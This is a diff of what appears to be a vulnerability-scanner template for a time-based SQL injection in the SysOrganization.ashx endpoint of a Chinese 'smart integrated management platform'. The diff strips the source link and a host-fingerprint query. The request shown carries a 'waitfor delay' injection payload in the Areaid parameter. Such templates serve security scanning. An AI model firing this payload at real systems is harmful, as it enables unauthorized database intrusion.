@@ -3,12 +3,8 @@ info:
   name: 智慧综合管理平台系统 SysOrganization.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bbtqqib5oqrevwlr'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bbtqqib5oqrevwlr
-    fofa: title="智慧综合管理平台登入"
 http:
 - raw:
   - 'GET /Module/Kernel/Controller/SysOrganization.ashx?Areaid=-1);%20waitfor%20delay%20''0:0:5''%20--%20&action=GetAreaOrgTree HTTP/1.1
